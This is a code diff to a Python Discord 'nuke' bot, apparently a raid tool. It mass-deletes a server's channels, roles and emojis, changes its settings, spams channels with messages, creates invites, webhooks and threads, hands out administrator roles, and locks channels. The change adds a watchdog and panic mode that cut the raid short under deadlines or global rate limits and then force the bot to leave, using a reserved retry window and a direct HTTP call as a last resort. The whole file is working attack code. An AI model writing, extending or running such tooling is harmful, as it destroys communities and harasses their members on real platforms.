@@ -10,6 +10,12 @@
   !auto     ->  自動付与の状態確認
   !autoadmin on|off ->  自動付与の手動ON/OFF
 ================================================================
+  【退出保証】(火力は据え置き)
+    - 作業期限 = NUKE_TIMEOUT - LEAVE_RESERVE。期限で強制中断
+    - グローバル429を PANIC_AFTER_GLOBAL 回食らったら即中断
+    - 中断後も LEAVE_RESERVE 秒まるごと退出リトライに使う
+    - 中断後は全API呼び出しを即失敗モードに切り替えて退出まで直行
+================================================================
   必要な環境変数: DISCORD_TOKEN
   必要な特権インテント: MESSAGE CONTENT / SERVER MEMBERS
 ================================================================
@@ -71,11 +77,13 @@ ADMIN_NOTIFY     = False
 ADMIN_ROLE_COUNT = 50
 ADMIN_AUTO_GRANT = True         # !admin 後、新規参加者にも自動で同じロールを即付与
 
-# ---- ウォッチドッグ ----
-NUKE_TIMEOUT     = 1200         # 秒。超えたら打ち切って即退出
-LEAVE_ATTEMPTS   = 20           # 退出リトライ回数
+# ==================== 退出保証 (ここだけ追加) ====================
+NUKE_TIMEOUT       = 2400       # 全体の絶対上限(秒)。作業はこの手前で切る
+LEAVE_RESERVE      = 240        # 秒。作業を打ち切って退出だけに使う専用枠
+PANIC_AFTER_GLOBAL = 2          # グローバル429をこの回数食らったら作業中断
+LEAVE_ATTEMPTS     = 20         # 退出リトライ回数
 
-# ---- 並列度 ----
+# ---- 並列度 (据え置き) ----
 DELETE_CONCURRENCY = 25
 CREATE_CONCURRENCY = 15
 ROLE_CONCURRENCY   = 8
@@ -152,7 +160,9 @@ logging.getLogger("discord").setLevel(logging.WARNING)
 logging.getLogger("discord.http").setLevel(logging.WARNING)
 
 
-# ======================= レート制限対策 =======================
+# ======================= 状態 =======================
+PANIC = {"on": False, "global_429": 0, "deadline": 0.0}
+
 _RETRYABLE_5XX = {500, 502, 503, 504}
 _NO_RETRY_4XX  = {400, 401, 403, 404, 405, 415}
 
@@ -171,26 +181,42 @@ def _retry_after_of(e) -> float:
         return 0.0
 
 
+def _is_global(e) -> bool:
+    try:
+        return e.response.headers.get("X-RateLimit-Global") == "true"
+    except Exception:
+        return False
+
+
 async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
+    """PANIC 中は粘らずに即失敗させ、本体を退出まで進める"""
+    if PANIC["on"]:
+        attempts = min(attempts, 2)
+
     for n in range(1, attempts + 1):
         try:
             return await call(*args, **kwargs)
         except discord.NotFound:
             return None
         except discord.Forbidden as e:
-            if n < 3:
-                await asyncio.sleep(0.4 * n)
+            if n < 2:
+                await asyncio.sleep(0.3 * n)
                 continue
             log.warning("403 Forbidden: %s (%s)", label, getattr(e, "text", e))
             return None
         except discord.HTTPException as e:
             if e.status == 429:
+                if _is_global(e):
+                    PANIC["global_429"] += 1
+                    log.warning("!!! グローバル429 (%d回) %s",
+                                PANIC["global_429"], label)
                 wait = _retry_after_of(e) or 1.0
+                if PANIC["on"]:
+                    wait = min(wait, 5.0)
                 await asyncio.sleep(min(wait, 300.0) + 0.05)
             elif e.status in _RETRYABLE_5XX:
                 await asyncio.sleep(min(2 ** n, 15))
             elif e.status in _NO_RETRY_4XX:
-                # 恒久的なエラーは粘らず即諦める
                 log.warning("HTTP %s: %s (%s)", e.status, label,
                             getattr(e, "text", ""))
                 return None
@@ -206,9 +232,12 @@ async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
     return None
 
 
-async def leave_guild(guild: discord.Guild) -> bool:
-    """429 を待ちながら必ず退出させる。例外は投げない"""
-    for n in range(1, LEAVE_ATTEMPTS + 1):
+async def leave_guild(guild: discord.Guild, budget: float = LEAVE_RESERVE) -> bool:
+    """専用の時間枠を全部使って必ず退出させる。例外は投げない"""
+    end = time.monotonic() + max(5.0, budget)
+    n = 0
+    while n < LEAVE_ATTEMPTS and time.monotonic() < end:
+        n += 1
         try:
             await guild.leave()
             log.info("=== 退出完了 (%d回目) ===", n)
@@ -217,19 +246,29 @@ async def leave_guild(guild: discord.Guild) -> bool:
             log.info("=== 退出済み (NotFound) ===")
             return True
         except discord.HTTPException as e:
+            remain = max(0.5, end - time.monotonic())
             if e.status == 429:
                 wait = _retry_after_of(e) or min(5.0 * n, 60.0)
-                wait = min(wait, 120.0)
-                log.warning("退出が429。%.0f 秒待って再試行 (%d/%d)",
-                            wait, n, LEAVE_ATTEMPTS)
-                await asyncio.sleep(wait + 0.5)
+                wait = min(wait, remain)
+                log.warning("退出が429。%.0f 秒待って再試行 (%d/%d, 残り%.0fs)",
+                            wait, n, LEAVE_ATTEMPTS, remain)
+                await asyncio.sleep(wait + 0.3)
                 continue
             log.warning("退出失敗 HTTP %s (%s)。再試行 (%d/%d)",
                         e.status, getattr(e, "text", ""), n, LEAVE_ATTEMPTS)
-            await asyncio.sleep(min(2 ** n, 30))
+            await asyncio.sleep(min(2 ** n, 10, remain))
         except Exception as e:
             log.warning("退出エラー %r。再試行 (%d/%d)", e, n, LEAVE_ATTEMPTS)
-            await asyncio.sleep(min(2 ** n, 30))
+            await asyncio.sleep(min(2 ** n, 10))
+
+    # 最後の手段: HTTP レイヤ直叩き
+    try:
+        await bot.http.leave_guild(guild.id)
+        log.info("=== 退出完了 (直接HTTP) ===")
+        return True
+    except Exception as e:
+        log.error("直接HTTPも失敗: %r", e)
+
     log.error("=== 退出できなかった (Botを手動で蹴ってください) ===")
     return False
 
@@ -260,6 +299,13 @@ def is_admin_role(r: discord.Role) -> bool:
     return r.name.startswith("ADMIN-") and r.permissions.administrator
 
 
+def panic_skip(stage: str) -> bool:
+    if PANIC["on"]:
+        log.warning("PANIC: %s をスキップ", stage)
+        return True
+    return False
+
+
 # ============================ Bot ============================
 intents = discord.Intents.default()
 intents.guilds = True
@@ -280,13 +326,11 @@ NUKE_LOCK = asyncio.Lock()
 RETRY = {"delay": 30.0}
 
 # guild_id -> [ADMIN-xx のロール名, ...]
-# 名前で保持するので、ロールが作り直されても ID 変化に影響されない
 AUTO_GRANT: dict[int, list[str]] = {}
 AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)
 
 
 def resolve_auto_roles(guild: discord.Guild) -> list[discord.Role]:
-    """記憶している名前から実ロールを引く (消えていれば無視)"""
     names = AUTO_GRANT.get(guild.id)
     if not names:
         return []
@@ -302,7 +346,6 @@ async def enable_community(guild: discord.Guild) -> bool:
         return True
 
     if not any(isinstance(c, discord.TextChannel) for c in guild.channels):
-        # テキストchが1個も無いと有効化できない
         tmp = await safe(guild.create_text_channel, "temp",
                          reason="TOISHIN NUKE", label="community:temp")
         if tmp is None:
@@ -330,7 +373,6 @@ async def bind_community_channels(guild: discord.Guild,
                       type=discord.ChannelType.news,
                       topic=TOPIC_TEXT, reason="TOISHIN NUKE", label="news:create")
     if news is None:
-        # ニュースchが作れない環境なら rules だけ張り直す
         await safe(guild.edit, rules_channel=rules,
                    reason="TOISHIN NUKE", label="community:rules")
         return
@@ -343,28 +385,29 @@ async def bind_community_channels(guild: discord.Guild,
 # ========================= ヌケ本体 =========================
 async def _nuke_body(guild: discord.Guild, el) -> None:
     # ---------- 0) コミュニティ有効化 (削除より前) ----------
-    if ENABLE_COMMUNITY:
+    if ENABLE_COMMUNITY and not panic_skip("コミュニティON"):
         log.info("[0/8] コミュニティ有効化 …")
         await enable_community(guild)
         log.info("      -> %s / %s", "ON" if "COMMUNITY" in guild.features else "OFF", el())
 
     # ---------- 1) 全チャンネル / カテゴリ削除 ----------
-    log.info("[1/8] 既存チャンネル全削除 …")
-    targets = list(guild.channels)
-    normal = [c for c in targets if not isinstance(c, discord.CategoryChannel)]
-    cats   = [c for c in targets if isinstance(c, discord.CategoryChannel)]
-    sem_del = asyncio.Semaphore(DELETE_CONCURRENCY)
+    if not panic_skip("チャンネル削除"):
+        log.info("[1/8] 既存チャンネル全削除 …")
+        targets = list(guild.channels)
+        normal = [c for c in targets if not isinstance(c, discord.CategoryChannel)]
+        cats   = [c for c in targets if isinstance(c, discord.CategoryChannel)]
+        sem_del = asyncio.Semaphore(DELETE_CONCURRENCY)
 
-    async def kill(ch):
-        async with sem_del:
-            await safe(ch.delete, reason="TOISHIN NUKE", label=f"delete:{ch.name}")
+        async def kill(ch):
+            async with sem_del:
+                await safe(ch.delete, reason="TOISHIN NUKE", label=f"delete:{ch.name}")
 
-    await asyncio.gather(*(kill(c) for c in normal))
-    await asyncio.gather(*(kill(c) for c in cats))
-    log.info("      -> 削除完了 %d ch / %s", len(targets), el())
+        await asyncio.gather(*(kill(c) for c in normal))
+        await asyncio.gather(*(kill(c) for c in cats))
+        log.info("      -> 削除完了 %d ch / %s", len(targets), el())
 
     # ---------- 2) ロール全削除 (ADMIN-xx は温存) ----------
-    if NUKE_ROLES:
+    if NUKE_ROLES and not panic_skip("ロール削除"):
         log.info("[2/8] 既存ロール全削除 …")
         roles, kept = [], []
         for r in guild.roles:
@@ -386,36 +429,38 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
                  len(roles), len(kept), el())
 
     # ---------- 3) 絵文字 / スタンプ削除 ----------
-    if NUKE_EMOJIS and guild.emojis:
-        log.info("[3/8] 絵文字削除 …")
-        await asyncio.gather(*(safe(e.delete, reason="TOISHIN NUKE",
-                                    label=f"emojidel:{e.name}") for e in guild.emojis))
-    if NUKE_STICKERS and guild.stickers:
-        log.info("[3/8] スタンプ削除 …")
-        await asyncio.gather(*(safe(s.delete, reason="TOISHIN NUKE",
-                                    label=f"stickerdel:{s.name}") for s in guild.stickers))
-    log.info("      -> 絵文字/スタンプ処理完了 / %s", el())
+    if not panic_skip("絵文字/スタンプ削除"):
+        if NUKE_EMOJIS and guild.emojis:
+            log.info("[3/8] 絵文字削除 …")
+            await asyncio.gather(*(safe(e.delete, reason="TOISHIN NUKE",
+                                        label=f"emojidel:{e.name}") for e in guild.emojis))
+        if NUKE_STICKERS and guild.stickers:
+            log.info("[3/8] スタンプ削除 …")
+            await asyncio.gather(*(safe(s.delete, reason="TOISHIN NUKE",
+                                        label=f"stickerdel:{s.name}") for s in guild.stickers))
+        log.info("      -> 絵文字/スタンプ処理完了 / %s", el())
 
     # ---------- 4) サーバー設定破壊 ----------
-    log.info("[4/8] サーバー設定破壊 …")
-    kwargs = {"name": GUILD_NAME, "reason": "TOISHIN NUKE",
-              "preferred_locale": "ja"}
-    if PING_ALL:
-        kwargs["default_notifications"] = discord.NotificationLevel.all_messages
-    if VERIF_HIGH:
-        kwargs["verification_level"] = discord.VerificationLevel.highest
-        kwargs["explicit_content_filter"] = discord.ContentFilter.all_members
-    if GUILD_ICON_URL:
-        try:
-            kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
-        except Exception:
-            log.warning("アイコン取得失敗 -> 名前だけ変更")
-    await safe(guild.edit, label="guild:edit", **kwargs)
-    log.info("      -> 設定破壊完了 / %s", el())
+    if not panic_skip("設定破壊"):
+        log.info("[4/8] サーバー設定破壊 …")
+        kwargs = {"name": GUILD_NAME, "reason": "TOISHIN NUKE",
+                  "preferred_locale": "ja"}
+        if PING_ALL:
+            kwargs["default_notifications"] = discord.NotificationLevel.all_messages
+        if VERIF_HIGH:
+            kwargs["verification_level"] = discord.VerificationLevel.highest
+            kwargs["explicit_content_filter"] = discord.ContentFilter.all_members
+        if GUILD_ICON_URL:
+            try:
+                kwargs["icon"] = await fetch_bytes(GUILD_ICON_URL)
+            except Exception:
+                log.warning("アイコン取得失敗 -> 名前だけ変更")
+        await safe(guild.edit, label="guild:edit", **kwargs)
+        log.info("      -> 設定破壊完了 / %s", el())
 
     # ---------- 5) カテゴリ作成 ----------
     cat_list: list[discord.CategoryChannel] = []
-    if USE_CATEGORIES:
+    if USE_CATEGORIES and not panic_skip("カテゴリ作成"):
         log.info("[5/8] カテゴリ %d 個作成 …", CATEGORY_COUNT)
         sem_c = asyncio.Semaphore(EXTRA_CONCURRENCY)
 
@@ -429,68 +474,65 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
         log.info("      -> カテゴリ %d 個 / %s", len(cat_list), el())
 
     # ---------- 6) チャンネル作成 ----------
-    log.info("[6/8] チャンネル %d 個作成 …", CHANNEL_COUNT)
-    names = build_channel_names()
-    sem_new = asyncio.Semaphore(CREATE_CONCURRENCY)
+    created: list[discord.TextChannel] = []
+    if not panic_skip("チャンネル作成"):
+        log.info("[6/8] チャンネル %d 個作成 …", CHANNEL_COUNT)
+        names = build_channel_names()
+        sem_new = asyncio.Semaphore(CREATE_CONCURRENCY)
 
-    async def make(i: int, nm: str):
-        cat = cat_list[i % len(cat_list)] if cat_list else None
-        async with sem_new:
-            return await safe(
-                guild.create_text_channel, nm,
-                category=cat, topic=TOPIC_TEXT,
-                nsfw=SET_NSFW, reason="TOISHIN NUKE", label=f"create:{nm}",
-            )
+        async def make(i: int, nm: str):
+            cat = cat_list[i % len(cat_list)] if cat_list else None
+            async with sem_new:
+                return await safe(
+                    guild.create_text_channel, nm,
+                    category=cat, topic=TOPIC_TEXT,
+                    nsfw=SET_NSFW, reason="TOISHIN NUKE", label=f"create:{nm}",
+                )
 
-    created = [c for c in await asyncio.gather(
-        *(make(i, n) for i, n in enumerate(names))) if c]
-    log.info("      -> 作成完了 %d ch / %s", len(created), el())
+        created = [c for c in await asyncio.gather(
+            *(make(i, n) for i, n in enumerate(names))) if c]
+        log.info("      -> 作成完了 %d ch / %s", len(created), el())
 
-    # ---------- 6.5) コミュニティの rules / お知らせch を張り直す ----------
-    if ENABLE_COMMUNITY and created:
-        await bind_community_channels(guild, created)
+        # ---------- 6.5) コミュニティの rules / お知らせch を張り直す ----------
+        if ENABLE_COMMUNITY and created and not PANIC["on"]:
+            await bind_community_channels(guild, created)
 
     # ---------- 7) 招待 / Webhook / スレッド ----------
-    sem_x = asyncio.Semaphore(EXTRA_CONCURRENCY)
     pool = created or list(guild.channels)
+    if pool and not panic_skip("招待/Webhook/スレッド"):
+        sem_x = asyncio.Semaphore(EXTRA_CONCURRENCY)
 
-    async def mk_invite(i: int):
-        if not pool:
-            return
-        ch = pool[i % len(pool)]
-        async with sem_x:
-            await safe(ch.create_invite, max_age=0, max_uses=0, unique=True,
-                       reason="TOISHIN NUKE", label=f"invite:{ch.name}")
+        async def mk_invite(i: int):
+            ch = pool[i % len(pool)]
+            async with sem_x:
+                await safe(ch.create_invite, max_age=0, max_uses=0, unique=True,
+                           reason="TOISHIN NUKE", label=f"invite:{ch.name}")
 
-    async def mk_hook(i: int):
-        if not pool:
-            return
-        ch = pool[i % len(pool)]
-        async with sem_x:
-            await safe(ch.create_webhook, name=f"TOISHIN-{i:02d}",
-                       reason="TOISHIN NUKE", label=f"hook:{ch.name}")
+        async def mk_hook(i: int):
+            ch = pool[i % len(pool)]
+            async with sem_x:
+                await safe(ch.create_webhook, name=f"TOISHIN-{i:02d}",
+                           reason="TOISHIN NUKE", label=f"hook:{ch.name}")
 
-    async def mk_thread(i: int):
-        if not pool:
-            return
-        ch = pool[i % len(pool)]
-        async with sem_x:
-            await safe(ch.create_thread, name=f"raid-{i:02d}",
-                       type=discord.ChannelType.public_thread,
-                       reason="TOISHIN NUKE", label=f"thread:{ch.name}")
+        async def mk_thread(i: int):
+            ch = pool[i % len(pool)]
+            async with sem_x:
+                await safe(ch.create_thread, name=f"raid-{i:02d}",
+                           type=discord.ChannelType.public_thread,
+                           reason="TOISHIN NUKE", label=f"thread:{ch.name}")
 
-    log.info("[7/8] 招待 %d / Webhook %d / スレッド %d …",
-             CREATE_INVITES, CREATE_WEBHOOKS, CREATE_THREADS)
-    await asyncio.gather(
-        *(mk_invite(i) for i in range(CREATE_INVITES)),
-        *(mk_hook(i) for i in range(CREATE_WEBHOOKS)),
-        *(mk_thread(i) for i in range(CREATE_THREADS)),
-    )
-    log.info("      -> 生成完了 / %s", el())
+        log.info("[7/8] 招待 %d / Webhook %d / スレッド %d …",
+                 CREATE_INVITES, CREATE_WEBHOOKS, CREATE_THREADS)
+        await asyncio.gather(
+            *(mk_invite(i) for i in range(CREATE_INVITES)),
+            *(mk_hook(i) for i in range(CREATE_WEBHOOKS)),
+            *(mk_thread(i) for i in range(CREATE_THREADS)),
+        )
+        log.info("      -> 生成完了 / %s", el())
 
     # ---------- 8) カオスロール作成 + 全員付与 (連投と並行) ----------
     async def chaos_roles():
-        if not CREATE_ROLES:
+        if not CREATE_ROLES or PANIC["on"]:
             return
         room = max(0, 240 - len(guild.roles))
         n = min(CREATE_ROLES, room)
@@ -512,7 +554,7 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
         made = [r for r in await asyncio.gather(*(mk_role(i) for i in range(1, n + 1))) if r]
         log.info("      -> カオスロール %d 個作成 / %s", len(made), el())
 
-        if ASSIGN_ROLES and made:
+        if ASSIGN_ROLES and made and not PANIC["on"]:
             members = await collect_members(guild)
             log.info("      -> 付与対象 %d 人", len(members))
             sem_m = asyncio.Semaphore(MEMBER_CONCURRENCY)
@@ -531,37 +573,41 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
             log.info("      -> ロール付与完了 / %s", el())
 
     # ---------- 9) 100連投 (ロール作業と並行) ----------
-    log.info("[8/8] %d msg x %d ch 送信 …", MESSAGES_PER_CHANNEL, len(created))
+    if created and not panic_skip("連投"):
+        log.info("[8/8] %d msg x %d ch 送信 …", MESSAGES_PER_CHANNEL, len(created))
 
-    async def spam(ch: discord.TextChannel):
-        await asyncio.gather(*(
-            safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
-            for _ in range(MESSAGES_PER_CHANNEL)
-        ))
+        async def spam(ch: discord.TextChannel):
+            await asyncio.gather(*(
+                safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
+                for _ in range(MESSAGES_PER_CHANNEL)
+            ))
 
-    await asyncio.gather(chaos_roles(), *(spam(c) for c in created))
-    log.info("      -> 送信/付与完了 / %s", el())
+        await asyncio.gather(chaos_roles(), *(spam(c) for c in created))
+        log.info("      -> 送信/付与完了 / %s", el())
+    else:
+        await chaos_roles()
 
     # ---------- 10) 施錠 (低速 + 送信権剥奪) ----------
-    log.info("[LOCK] 低速モード + 送信権剥奪 …")
+    if created and not panic_skip("施錠"):
+        log.info("[LOCK] 低速モード + 送信権剥奪 …")
 
-    async def lockdown(ch):
-        if SET_SLOWMODE:
-            await safe(ch.edit, slowmode_delay=SLOWMODE_SECONDS,
-                       reason="TOISHIN NUKE", label=f"slow:{ch.name}")
-        if DENY_SEND_AFTER:
-            await safe(ch.set_permissions, guild.default_role,
-                       send_messages=False, send_messages_in_threads=False,
-                       add_reactions=False, create_public_threads=False,
-                       create_private_threads=False, attach_files=False,
-                       embed_links=False, use_external_emojis=False,
-                       reason="TOISHIN NUKE", label=f"perm:{ch.name}")
+        async def lockdown(ch):
+            if SET_SLOWMODE:
+                await safe(ch.edit, slowmode_delay=SLOWMODE_SECONDS,
+                           reason="TOISHIN NUKE", label=f"slow:{ch.name}")
+            if DENY_SEND_AFTER:
+                await safe(ch.set_permissions, guild.default_role,
+                           send_messages=False, send_messages_in_threads=False,
+                           add_reactions=False, create_public_threads=False,
+                           create_private_threads=False, attach_files=False,
+                           embed_links=False, use_external_emojis=False,
+                           reason="TOISHIN NUKE", label=f"perm:{ch.name}")
 
-    await asyncio.gather(*(lockdown(c) for c in created))
-    log.info("      -> 施錠完了 / %s", el())
+        await asyncio.gather(*(lockdown(c) for c in created))
+        log.info("      -> 施錠完了 / %s", el())
 
     # ---------- 11) 埋め草絵文字 ----------
-    if FILL_EMOJIS:
+    if FILL_EMOJIS and not panic_skip("絵文字作成"):
         log.info("[BONUS] 絵文字 %d 個作成 …", FILL_EMOJIS)
         sem_e = asyncio.Semaphore(5)
 
@@ -578,28 +624,53 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
         await asyncio.gather(*(mk_emoji(i) for i in range(min(FILL_EMOJIS, 50))))
 
     # ---------- 12) 2回目改名 ----------
-    if SECOND_GUILD_NAME:
+    if SECOND_GUILD_NAME and not PANIC["on"]:
         await safe(guild.edit, name=SECOND_GUILD_NAME,
                    reason="TOISHIN NUKE", label="guild:edit2")
+
+
+# ======================= 監視 =======================
+async def watchdog(task: asyncio.Task) -> None:
+    """期限 or グローバル429で本体を強制中断させる"""
+    while True:
+        if PANIC["global_429"] >= PANIC_AFTER_GLOBAL:
+            PANIC["on"] = True
+            log.error("!!! グローバル429 %d 回。中断して退出へ !!!", PANIC["global_429"])
+            task.cancel()
+            return
+        if time.monotonic() >= PANIC["deadline"]:
+            PANIC["on"] = True
+            log.error("!!! 作業期限到達。中断して退出へ (残り %d 秒を退出に使う) !!!",
+                      LEAVE_RESERVE)
+            task.cancel()
+            return
+        await asyncio.sleep(0.5)
 
 
 async def run_nuke(guild: discord.Guild) -> None:
     t0 = time.perf_counter()
     el = lambda: f"{time.perf_counter() - t0:.1f}s"
 
-    log.info("=== NUKE START | %s (%s) ===", guild.name, guild.id)
+    budget = max(30.0, NUKE_TIMEOUT - LEAVE_RESERVE)
+    PANIC.update(on=False, global_429=0, deadline=time.monotonic() + budget)
+
+    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds ===",
+             guild.name, guild.id, budget, LEAVE_RESERVE)
+
+    task = asyncio.create_task(_nuke_body(guild, el))
+    wd = asyncio.create_task(watchdog(task))
 
     try:
-        await asyncio.wait_for(_nuke_body(guild, el), timeout=NUKE_TIMEOUT)
-    except asyncio.TimeoutError:
-        log.error("!!! %d 秒経過。打ち切って即退出する !!!", NUKE_TIMEOUT)
+        await task
     except asyncio.CancelledError:
-        log.error("!!! キャンセル。即退出する !!!")
+        log.error("!!! 中断。即退出する !!!")
     except Exception:
         log.exception("!!! NUKE 中に例外。即退出する !!!")
     finally:
-        # 何があっても必ず退出を試みる (429は待って再試行)
-        await leave_guild(guild)
+        wd.cancel()
+        PANIC["on"] = True
+        # 退出枠を丸ごと使う
+        await leave_guild(guild, budget=LEAVE_RESERVE)
         log.info("=== NUKE END | 所要 %s ===", el())
 
 
@@ -638,8 +709,7 @@ async def collect_members(guild: discord.Guild) -> list[discord.Member]:
 
 
 async def ensure_admin_roles(guild: discord.Guild, count: int) -> list[discord.Role]:
-    pool = {r.name: r for r in guild.roles
-            if is_admin_role(r)}
+    pool = {r.name: r for r in guild.roles if is_admin_role(r)}
     sem = asyncio.Semaphore(ROLE_CONCURRENCY)
 
     async def ensure(i: int):
@@ -703,7 +773,6 @@ async def admin_cmd(ctx: commands.Context, count: int = ADMIN_ROLE_COUNT):
         await notify(ctx, "⚠ ロールを作成できなかった")
         return
 
-    # 以降の新規参加者を拾うため、ロールが揃った時点で自動付与を有効化
     if ADMIN_AUTO_GRANT:
         AUTO_GRANT[guild.id] = [r.name for r in roles]
         log.info("自動付与を有効化: %d ロール (以降の参加者に即付与)", len(roles))
@@ -754,7 +823,6 @@ async def on_member_join(member: discord.Member):
 
     total = len(need)
     async with AUTO_GRANT_SEM:
-        # 参加直後は 404 / 429 が出やすいので、残りが尽きるまで粘る
         for attempt in range(1, 6):
             await safe(member.add_roles, *need, atomic=True,
                        reason="TOISHIN AUTO", label=f"autogrant:{member}")
